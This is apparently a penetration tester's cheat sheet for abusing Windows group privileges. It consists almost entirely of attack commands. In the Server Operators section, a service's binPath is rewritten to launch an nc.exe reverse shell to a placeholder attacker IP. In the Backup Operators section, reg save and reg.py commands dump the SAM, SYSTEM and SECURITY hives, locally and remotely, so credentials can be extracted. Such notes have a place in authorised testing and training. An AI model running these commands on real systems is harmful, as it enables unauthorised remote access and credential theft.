Some groups have certain privileges that can be exploited

## Server Operators

Exploitation
```bash
# List services running on target
services
	examples may include VMTools, VGAuthService, etc...

# Transfer over nc.exe to victim

# Modify path
sc.exe config VMTools binPath="C:\Path\to\nc.exe -e cmd.exe <attack_ip> <lport>"

# Start nc listener

# Restart VMTools
sc.exe stop VMTools
sc.exe start VMTools
```

## Backup Operators
If you have this, you can copy SAM, SYSTEM, and SECURITY hives
```bash
# Locally
reg save HKLM\SAM      C:\Windows\Temp\SAM
reg save HKLM\SYSTEM   C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
# If you want NTDS.dit, need to use VSS

# Remotely
reg.py <domain>/<user>:'<pass>'@<ip> backup -o '\\<ip>\C$\Windows\''
	# Then connect via smbclient if you can...
	nxc --shares # verify auth capabilities
	# Can also potentially save to a remote share (if no direct access to DC)

# Then just dump locally
```